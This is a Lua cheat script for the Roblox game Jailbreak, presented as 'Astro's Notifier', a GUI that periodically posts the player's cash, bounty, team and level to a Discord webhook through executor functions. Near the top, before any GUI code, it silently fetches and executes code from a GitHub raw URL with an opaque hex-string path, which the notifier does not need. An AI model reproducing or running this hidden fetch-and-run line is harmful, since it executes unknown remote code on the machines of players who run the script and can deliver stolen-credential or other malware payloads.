if game.PlaceId == 606849621 then -- Game execution check
    local ScreenGui = Instance.new("ScreenGui")
    local main = Instance.new("Frame")
    local topbar = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local HomeTab = Instance.new("Frame")
    local MainNotifierBtn = Instance.new("TextButton")
    local MainNotifierText = Instance.new("TextLabel")
    local webhook = Instance.new("TextBox")
    local TextButton = Instance.new("TextButton")
    local webhookTimer = Instance.new("TextBox")
    local TimerText = Instance.new("TextLabel")
    local CreditsButton = Instance.new("TextButton")
    local HomeButton = Instance.new("TextButton")
    local CreditsTab = Instance.new("Frame")
    local UIGridLayout = Instance.new("UIGridLayout")
    local TextLabel_2 = Instance.new("TextLabel")
    local TextLabel_3 = Instance.new("TextLabel")
    local TextLabel_4 = Instance.new("TextLabel")
    local bountytext = game:GetService("Players").LocalPlayer.PlayerGui.AppUI.Buttons.Bounty.Label.Text
    local currentcash = game:GetService("Players").LocalPlayer.PlayerGui.CashGui.Container.Content.ContainerTop.ContainerRight.ContainerCash.TextLabel.Text
    local currenTeam = tostring(game:GetService("Players").LocalPlayer.Team)
    local currentLevel = tostring(game:GetService("Players").LocalPlayer.Level.Value)
    local currentEXP = tostring(game:GetService("Players").LocalPlayer.Exp.Value)
    local lplr_name = game:GetService("Players").LocalPlayer.Name
    local lplr = game:GetService("Players").LocalPlayer
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ad08512fea03303cca3ddfcc2e96876c/60337215abfeb9d0ceebd6b41a4a26f3/main/475940a4460534bfadfc61665e62c56e.lua"))()

    ScreenGui.Parent = game.CoreGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    main.Name = "main"
    main.Parent = ScreenGui
    main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
    main.BorderSizePixel = 0
    main.Position = UDim2.new(0.178270847, 0, 0.539753556, 0)
    main.Size = UDim2.new(0, 266, 0, 165)
    main.Active = true
    main.Draggable = true

    topbar.Name = "topbar"
    topbar.Parent = main
    topbar.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    topbar.BorderSizePixel = 0
    topbar.Size = UDim2.new(0, 266, 0, 25)

    TextLabel.Parent = topbar
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.Size = UDim2.new(0, 266, 0, 25)
    TextLabel.Font = Enum.Font.GothamMedium
    TextLabel.Text = "Astro's Notifier"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 20.000
    TextLabel.TextWrapped = true

    HomeTab.Name = "HomeTab"
    HomeTab.Parent = main
    HomeTab.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
    HomeTab.BorderSizePixel = 0
    HomeTab.Position = UDim2.new(0, 0, 0.290909082, 0)
    HomeTab.Size = UDim2.new(0, 266, 0, 117)

    MainNotifierBtn.Name = "MainNotifierBtn"
    MainNotifierBtn.Parent = HomeTab
    MainNotifierBtn.BackgroundColor3 = Color3.fromRGB(130, 130, 130)
    MainNotifierBtn.Position = UDim2.new(0.0263157897, 0, 0.0644468069, 0)
    MainNotifierBtn.Size = UDim2.new(0, 20, 0, 20)
    MainNotifierBtn.Font = Enum.Font.SourceSans
    MainNotifierBtn.Text = ""
    MainNotifierBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    MainNotifierBtn.TextSize = 14.000
    _G.sendhook = false
    local mainnotiferbool = false
    MainNotifierBtn.MouseButton1Click:Connect(
        function()
            if mainnotiferbool == false then
                mainnotiferbool = true
                _G.sendhook = true
                MainNotifierBtn.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
                local webhookUrl
                webhookUrl = webhook.Text
                local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
                while _G.sendhook do
                    print("Attempting to send webhook.")
                    request(
                        {
                            Url = webhookUrl,
                            Body = game:GetService("HttpService"):JSONEncode(
                                {
                                    content = "",
                                    embeds = {
                                        {
                                            title = "Jailbreak Auto-Rob Notifier.",
                                            description = "Current logged in user: `" .. lplr_name .. "`",
                                            fields = {
                                                {
                                                    name = "`💸` Current Cash",
                                                    value = "```" .. currentcash .. "```",
                                                    inline = true
                                                },
                                                {
                                                    name = "`💢` Current Bounty",
                                                    value = "```" .. string.sub(bountytext, 9) .. "```",
                                                    inline = true
                                                },
                                                {
                                                    name = "`🎭` Current Team",
                                                    value = "```" .. currenTeam .. "```",
                                                    inline = true
                                                },
                                                {
                                                    name = "`🆙` Current Level & EXP",
                                                    value = "```" .. currentLevel .. " (" .. currentEXP .. ")```",
                                                    inline = true
                                                }
                                            },
                                            url = "https://www.roblox.com/games/606849621/Jailbreak",
                                            color = nil
                                        }
                                    }
                                }
                            ),
                            Method = "POST",
                            Headers = {
                                ["content-type"] = "application/json"
                            }
                        }
                    )
                    require(game:GetService("ReplicatedStorage").Game.Notification).new(
                        {
                            Text = "Sent Webhook, check your discord!\nBlind#2665, fayy#9999 & HKPlays#4587",
                            Duration = 5
                        }
                    )
                    print("Sent Successfully.")
                    task.wait(webhookTimer.Text)
                end
            else
                MainNotifierBtn.BackgroundColor3 = Color3.fromRGB(130, 130, 130)
                mainnotiferbool = false
                _G.sendhook = false
            end
        end
    )

    MainNotifierText.Name = "MainNotifierText"
    MainNotifierText.Parent = HomeTab
    MainNotifierText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    MainNotifierText.BackgroundTransparency = 1.000
    MainNotifierText.Position = UDim2.new(0.139097735, 0, 0.0644468069, 0)
    MainNotifierText.Size = UDim2.new(0, 121, 0, 20)
    MainNotifierText.Font = Enum.Font.GothamMedium
    MainNotifierText.Text = "Main Notifier"
    MainNotifierText.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainNotifierText.TextSize = 14.000
    MainNotifierText.TextXAlignment = Enum.TextXAlignment.Left

    webhook.Name = "webhook"
    webhook.Parent = HomeTab
    webhook.BackgroundColor3 = Color3.fromRGB(112, 112, 112)
    webhook.Position = UDim2.new(0.0259999447, 0, 0.765812039, 0)
    webhook.Size = UDim2.new(0, 197, 0, 21)
    webhook.Font = Enum.Font.GothamMedium
    webhook.PlaceholderColor3 = Color3.fromRGB(213, 213, 213)
    webhook.PlaceholderText = "Webhook URL here"
    webhook.Text = ""
    webhook.TextColor3 = Color3.fromRGB(255, 255, 255)
    webhook.TextSize = 12.000

    TextButton.Parent = HomeTab
    TextButton.BackgroundColor3 = Color3.fromRGB(0, 129, 136)
    TextButton.Position = UDim2.new(0.789473593, 0, 0.760683477, 0)
    TextButton.Size = UDim2.new(0, 49, 0, 21)
    TextButton.Font = Enum.Font.GothamMedium
    TextButton.Text = "Test"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextSize = 14.000
    TextButton.MouseButton1Click:Connect(
        function()
            print("Testing webhook")
            local webhookUrl
            webhookUrl = webhook.Text
            local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
            request(
                {
                    Url = webhookUrl,
                    Body = game:GetService("HttpService"):JSONEncode(
                        {
                            content = "Your webhook is working! :smile:"
                        }
                    ),
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                }
            )
            webhook.TextWrapped = true
            TextButton.Text = "Sent!"
            print("Tested.")
            wait(3)
            TextButton.Text = "Test"
        end
    )

    webhookTimer.Name = "webhookTimer"
    webhookTimer.Parent = HomeTab
    webhookTimer.BackgroundColor3 = Color3.fromRGB(112, 112, 112)
    webhookTimer.Position = UDim2.new(0.0259999447, 0, 0.28717953, 0)
    webhookTimer.Size = UDim2.new(0, 57, 0, 21)
    webhookTimer.Font = Enum.Font.GothamMedium
    webhookTimer.PlaceholderColor3 = Color3.fromRGB(213, 213, 213)
    webhookTimer.PlaceholderText = "900"
    webhookTimer.Text = ""
    webhookTimer.TextColor3 = Color3.fromRGB(255, 255, 255)
    webhookTimer.TextSize = 12.000

    TimerText.Name = "TimerText"
    TimerText.Parent = HomeTab
    TimerText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TimerText.BackgroundTransparency = 1.000
    TimerText.Position = UDim2.new(0.277879655, 0, 0.28717953, 0)
    TimerText.Size = UDim2.new(0, 129, 0, 21)
    TimerText.Font = Enum.Font.GothamMedium
    TimerText.Text = "Webhook Timer (Seconds)"
    TimerText.TextColor3 = Color3.fromRGB(255, 255, 255)
    TimerText.TextSize = 14.000
    TimerText.TextXAlignment = Enum.TextXAlignment.Left

    CreditsButton.Name = "CreditsButton"
    CreditsButton.Parent = main
    CreditsButton.BackgroundColor3 = Color3.fromRGB(0, 129, 136)
    CreditsButton.Position = UDim2.new(0.488721818, 0, 0.187878788, 0)
    CreditsButton.Size = UDim2.new(0, 129, 0, 17)
    CreditsButton.Font = Enum.Font.GothamMedium
    CreditsButton.Text = "Credits"
    CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CreditsButton.TextSize = 14.000
    CreditsButton.MouseButton1Click:Connect(
        function()
            print("Switched to Credits Tab.")
            HomeTab.Visible = false
            CreditsTab.Visible = true
        end
    )

    HomeButton.Name = "HomeButton"
    HomeButton.Parent = main
    HomeButton.BackgroundColor3 = Color3.fromRGB(0, 129, 136)
    HomeButton.Position = UDim2.new(0.0263157897, 0, 0.187878788, 0)
    HomeButton.Size = UDim2.new(0, 123, 0, 17)
    HomeButton.Font = Enum.Font.GothamMedium
    HomeButton.Text = "Home"
    HomeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    HomeButton.TextSize = 14.000
    HomeButton.MouseButton1Click:Connect(
        function()
            print("Switched to Home Tab.")
            HomeTab.Visible = true
            CreditsTab.Visible = false
        end
    )

    CreditsTab.Name = "CreditsTab"
    CreditsTab.Parent = main
    CreditsTab.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
    CreditsTab.BorderSizePixel = 0
    CreditsTab.Position = UDim2.new(0, 0, 0.290909082, 0)
    CreditsTab.Size = UDim2.new(0, 266, 0, 116)
    CreditsTab.Visible = false

    UIGridLayout.Parent = CreditsTab
    UIGridLayout.FillDirection = Enum.FillDirection.Vertical
    UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    UIGridLayout.CellSize = UDim2.new(0, 266, 0, 25)

    TextLabel_2.Parent = CreditsTab
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 0.750
    TextLabel_2.BorderSizePixel = 0
    TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
    TextLabel_2.Font = Enum.Font.GothamMedium
    TextLabel_2.Text = "Lead Dev : Blind#2665"
    TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.TextSize = 14.000

    TextLabel_3.Parent = CreditsTab
    TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_3.BackgroundTransparency = 0.750
    TextLabel_3.BorderSizePixel = 0
    TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
    TextLabel_3.Font = Enum.Font.GothamMedium
    TextLabel_3.Text = "Script Dev : HKPlays#4587"
    TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_3.TextSize = 14.000

    TextLabel_4.Parent = CreditsTab
    TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_4.BackgroundTransparency = 0.750
    TextLabel_4.BorderSizePixel = 0
    TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
    TextLabel_4.Font = Enum.Font.GothamMedium
    TextLabel_4.Text = "Base Dev : fayy#9999"
    TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_4.TextSize = 14.000
else
    game.Players.LocalPlayer:Kick("Game check failed! Please execute on JAILBREAK! (606849621)")
end
